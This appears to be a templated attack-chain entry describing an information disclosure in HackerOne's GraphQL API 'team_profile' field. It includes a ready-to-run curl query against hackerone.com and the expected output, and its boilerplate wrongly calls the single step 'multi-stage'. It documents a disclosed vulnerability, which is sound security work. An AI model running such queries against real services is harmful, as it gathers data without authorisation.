---
id: ac-uuid-001
tags:
  - graphql
  - information-disclosure
  - api
  - hackerone
type: attack_chain
tools: []
tactics:
  - '[[Reconnaissance]]'
verified: false
platforms:
  - Web
submitted: true
complexity: low
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-GraphQL-team-profile-for-Team-Metrics-Disclosure]]'
step_count: 1
techniques:
  - '[[Gather Victim Host Information]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:25:59.785Z'
description: >-
  A single-step attack exploiting an information disclosure vulnerability in
  HackerOne's GraphQL API, where the newly added 'team_profile' field exposes
  sensitive internal team metrics without access controls.
skill_level: intermediate
impact_level: low
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Gather Victim Host Information]]'
  - '[[Exploit Public-Facing Application]]'
---
# Information Disclosure via HackerOne GraphQL team_profile Field

Multi-stage attack chain demonstrating a complete attack workflow.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Low |
| Impact Level | Low |

## Attack Flow Visualization

```mermaid
graph LR
    A[Query GraphQL API] --> B[Retrieve Sensitive Metrics]

    style A fill:#e74c3c
    style B fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (uses standard HTTP client like curl)

### Target Environment

- Web platform with GraphQL API endpoint
- No authentication required for public queries
- Network access to the target API (e.g., https://hackerone.com/graphql)

### Initial Access Requirements

- Public internet access
- No credentials needed
- Knowledge of GraphQL query syntax

## Detailed Attack Procedures

### Step 1: Query team_profile Field
procedure: [[procedures/Exploit-GraphQL-team-profile-for-Team-Metrics-Disclosure]]

**Objective**: Discover and retrieve sensitive internal team metrics by querying the exposed 'team_profile' field on the 'security' team object.

**Instructions**: Identify the GraphQL endpoint and craft a query targeting the team handle 'security'. Use [[commands/curl-graphql-query]] to send a POST request with the following GraphQL query:

```bash
curl -X POST https://hackerone.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query { team(handle: \"security\") { team_profile { disclosed_reports_in_last_year_count latest_report_created_at latest_serious_report_created_at reports_received_in_three_months_count } } }"}'
```

Validate the response for fields like report counts and dates.

**Expected Output**: JSON response containing internal metrics, such as {"data":{"team":{"team_profile":{"disclosed_reports_in_last_year_count":X,"latest_report_created_at":"YYYY-MM-DD","latest_serious_report_created_at":"YYYY-MM-DD","reports_received_in_three_months_count":Y}}}}

**Success Indicators**:
- Response includes non-public fields like report counts and creation dates
- No errors in query execution
- Data reveals internal statistics (e.g., number of reports in three months)

## Attack Chain Summary

### Key Achievements

1. Exposed sensitive team metrics including report volumes and timestamps
2. Demonstrated lack of access controls on new GraphQL field
3. Highlighted potential for reconnaissance on security team operations

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Gather Victim Host Information]] Gather Victim Host Information
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### MITRE ATT&CK Tactics

- [[Reconnaissance]] Reconnaissance

---
*Last updated: 2023-10-01T00:00:00Z*
